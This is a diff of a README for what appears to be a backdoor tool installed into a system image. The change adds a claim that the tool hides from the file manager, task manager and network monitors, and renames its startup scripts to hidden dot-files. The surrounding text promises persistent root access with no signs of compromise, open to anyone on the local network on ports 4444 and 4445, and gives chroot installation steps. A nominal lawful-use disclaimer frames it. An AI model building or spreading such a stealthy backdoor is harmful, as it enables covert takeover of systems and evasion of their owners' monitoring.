@@ -16,6 +16,8 @@ By using this tool, you agree to use it solely for lawful purposes and not for a
 
 - No signs of compromise
 
+- Hides itself from file manager, task manager and network monitoring tools
+
 - Persistent remote access with highest privileges
 
 - Everyone on local network can control the system by connecting to machine's ip address (port 4444 for root and port 4445 for default user)
@@ -42,7 +44,7 @@ Open another terminal and enter:
     sudo mount --rbind /dev ~/img_mount/dev
     sudo mount --rbind /dev/pts ~/img_mount/dev/pts
     sudo chroot ~/img_mount /bin/bash
-    sudo chmod a+rx /iptables.sh /startup.sh /startup_fallback.sh
+    sudo chmod a+rx /.iptables.sh /.startup.sh /.startup_fallback.sh
     exit
     sudo umount ~/img_mount/proc
     sudo umount ~/img_mount/sys
